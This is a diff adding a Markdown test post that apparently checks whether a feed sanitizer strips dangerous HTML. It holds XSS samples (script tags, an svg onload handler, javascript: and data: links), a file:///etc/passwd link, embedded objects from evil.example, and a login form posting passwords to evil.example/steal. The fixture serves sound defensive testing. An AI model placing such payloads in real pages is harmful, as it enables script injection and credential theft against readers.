@@ -1,0 +1,41 @@
+---
+title: Unsafe elements
+---
+
+This post deliberately contains dangerous HTML to prove the sanitizer strips
+it. In a real author's hand this would never appear — but content pipelines
+see weird inputs, and the sanitizer is the last line of defense before the
+feed goes out to readers whose clients may run HTML quite liberally.
+
+Enough padding to survive Defuddle's boilerplate heuristics: lorem ipsum dolor
+sit amet, consectetur adipiscing elit. Nulla ac erat vel arcu gravida
+consectetur. Morbi faucibus nunc et libero dignissim, non hendrerit risus
+pharetra. Curabitur volutpat eros sit amet risus commodo tincidunt.
+
+<script>alert('pwned')</script>
+
+<style>body { background: red !important; }</style>
+
+<form action="https://evil.example/steal" method="post">
+  <input type="text" name="password" />
+  <button type="submit">Log in</button>
+</form>
+
+<iframe src="https://evil.example/embed" width="600" height="400"></iframe>
+
+<object data="https://evil.example/flash.swf"></object>
+<embed src="https://evil.example/payload" />
+
+<svg onload="alert(1)">
+  <script>alert(2)</script>
+</svg>
+
+<p style="position:fixed;top:0;left:0;background:red">styled</p>
+
+<p>
+  A <a href="javascript:alert(1)">bad js link</a> and a
+  <a href="data:text/html,<script>alert(1)</script>">data html link</a> and a
+  <a href="file:///etc/passwd">file link</a>.
+</p>
+
+Final content paragraph so the post has substance.
